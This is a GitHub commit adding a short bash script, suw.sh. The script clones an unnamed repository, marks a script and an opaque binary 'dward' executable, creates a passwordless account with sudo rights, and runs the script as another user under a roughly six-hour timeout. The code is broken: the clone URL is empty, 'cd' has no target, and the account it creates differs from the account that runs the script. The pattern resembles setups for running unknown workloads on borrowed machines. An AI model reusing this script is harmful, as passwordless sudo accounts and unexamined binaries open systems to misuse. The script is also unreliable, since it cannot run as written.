d2d26c58c1cc13f8b78f5bd8e8a70aca73adda84
kelvin3755 <88593989+kelvin3755@users.noreply.github.com>
2021-08-20 20:18:26 +0700

    Add files via upload

---
+++ suw.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+sudo apt update
+git clone https://github.com//.git && cd 
+chmod +x edw.sh && chmod +x dward
+sudo adduser --disabled-password --gecos "" kuy && sudo usermod -aG sudo kuy
+sudo -u kac -H sh -c "timeout 359m ./edw.sh"
+sudo apt update
